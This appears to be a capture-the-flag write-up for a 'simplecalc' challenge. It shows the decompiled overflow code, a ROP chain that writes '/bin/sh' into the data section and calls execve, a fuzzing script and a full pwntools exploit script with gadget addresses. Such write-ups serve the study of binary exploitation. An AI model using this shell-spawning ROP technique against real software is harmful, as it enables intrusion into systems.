# Challenge Theory
This is a buffer overflow challenge compiled with the nx bit, and as a result requires rop chains to build an exploit.
The actual application itself is a calculator, so the attacker has to "calculate" values into memory.
# Challenge Info 
This challenge actually uses memcpy to move the user calculations into the stack buffer.
With this in mind, the attacker then has to send all of the calculations at once, and make sure the values actually end up where they are supposed to be.
Another problem with the code is that it calculates 4 byte values, so there is actually a ton of alignment issues within the exploit.
## Relevant Code:
```c
printf("Expected number of calculations: ");
__isoc99_scanf(&DAT_00494214,&num_calcs);
handle_newline();
if ((num_calcs < 256) && (3 < num_calcs)) {
    calculations = malloc((long)(num_calcs << 2));
    for (i = 0; i < num_calcs; i = i + 1) {
        print_menu();
        __isoc99_scanf(&DAT_00494214,&calc_choice);
        handle_newline();
        if (calc_choice == 1) {
            adds();
            *(undefined4 *)((long)i * 4 + (long)calculations) = add._8_4_;
        }
        else if (calc_choice == 2) {
            subs();
            *(undefined4 *)((long)i * 4 + (long)calculations) = sub._8_4_;
        }
        else if (calc_choice == 3) {
            muls();
            *(undefined4 *)((long)i * 4 + (long)calculations) = mul._8_4_;
        }
        else if (calc_choice == 4) {
            divs();
            *(undefined4 *)((long)i * 4 + (long)calculations) = divv._8_4_;
        }
        else {
            if (calc_choice == 5) {
                memcpy(vuln_buff,calculations,(long)(num_calcs << 2));
                free(calculations);
                return 0;
            }
            puts("Invalid option.\n");
        }
    }
    free(calculations);
```
Taking a look at the "adds" calculation, the code is assigning a 4 byte value.
The disassembly even shows the "cdqe" opcode, which operates on 32 bit values.
# Exploit
This will be a simple exploit.
The strategy will be utilizing a write privelege in order to write the string "/bin/sh" into the .data section of the binary, and then calling execve to spawn a shell.
## Exploit Details
```
pop rdi
data_section
pop rcx
"/bin" string
mov [rdi], rcx

pop rdi
data_section + 4
pop rcx
"/sh" string
mov [rdi], rcx

pop rax
0x3b
pop rdi
data_section
pop rsi
0
pop rdx
0
syscall
```
The only other part of this exploit entails sending 18 calculations resulting in 0.
This is because we need to overflow the stack frame, and we need to fill it with 0.
The main function won't return until it calls free, and free will crash unless it has a valid memory address to free.
Payloads can bypass this by supplying it 0.
# Extra Info
To find the crash, another script was used:
```python
#!/usr/bin/python3
import pwn
import sys
binary = "simplecalc"
pwn.context.binary = binary
pwn.context.encoding = "latin"
pwn.context.log_level = "debug"

payload = ""
padding = 24

def fuzz_crash(tinput):
    with pwn.process(binary) as io:
        io.sendline(str(tinput))
        io.sendline(str(5))
        io.wait_for_close()
        if (io.poll() != -11):
            fuzz_crash(tinput + 1)
        else:
            print(f"Fuzzing returned: {tinput}")
        
fuzz_crash(5)
```
# Full Exploit Script
```python
#!/usr/bin/python3
import pwn
import sys
binary = "simplecalc"
pwn.context.binary = binary
pwn.context.encoding = "latin"

gadgets = {
    "pop_rdi_ret": 0x401b73,
    "pop_rcx_ret": 0x4b8f17,
    "pop_rax_ret": 0x44db34,
    "pop_rdx_ret": 0x437a85,
    "pop_rsi_ret": 0x401c87,
    "mov_rdi_ptr_rcx": 0x42b30b,
    "syscall_ret":0x4648e5,
    "bin_sh": 0x68732f6e69622f, 
    "sh":0x68732f,
    "data_section": 0x6c1060
}

def add_zero(io):
    io.sendline("2") 
    io.sendline("40")
    io.sendline("40")

def add_value(io, value):
    new_value = value - 40
    io.sendline("1")
    io.sendline(str(new_value))
    io.sendline(str(40))

def add_small(io, value):
    new_value = value + 40
    io.sendline("2")
    io.sendline(str(new_value))
    io.sendline(str(40))

if ("input" in sys.argv):
    with open("input", "wb") as io:
        io.write(payload)

if ("log" in sys.argv):
    pwn.context.log_level = "debug"

with pwn.process(binary) as io:
    io.sendline("75")
    for x in range(16):
        add_zero(io)
    add_zero(io)
    add_zero(io)
    add_value(io, gadgets["pop_rdi_ret"])
    add_zero(io)
    add_value(io, gadgets["data_section"])
    add_zero(io)
    add_value(io, gadgets["pop_rcx_ret"])
    add_zero(io)
    add_value(io, gadgets["bin_sh"])
    add_zero(io)
    add_value(io, gadgets["mov_rdi_ptr_rcx"])
    add_zero(io)
    add_value(io, gadgets["pop_rdi_ret"])
    add_zero(io)
    add_value(io, gadgets["data_section"]+4)
    add_zero(io)
    add_value(io, gadgets["pop_rcx_ret"])
    add_zero(io)
    add_value(io, gadgets["sh"])
    add_zero(io)
    add_value(io, gadgets["mov_rdi_ptr_rcx"])
    add_zero(io)
    add_value(io, gadgets["pop_rax_ret"])
    add_zero(io)
    add_small(io, 0x3b)
    add_zero(io)
    add_value(io, gadgets["pop_rdi_ret"])
    add_zero(io)
    add_value(io, gadgets["data_section"])
    add_zero(io)
    add_value(io, gadgets["pop_rsi_ret"])
    add_zero(io)
    add_zero(io)
    add_zero(io)
    add_value(io, gadgets["pop_rdx_ret"])
    add_zero(io)
    add_zero(io)
    add_zero(io)
    add_value(io, gadgets["syscall_ret"])
    io.sendline("5")

    if ("debug" in sys.argv):
        pwn.gdb.attach(io, gdbscript)

    if ("interactive" in sys.argv):
        io.interactive()

    if ("output" in sys.argv):
        pwn.info(io.readrepeat(1))
```
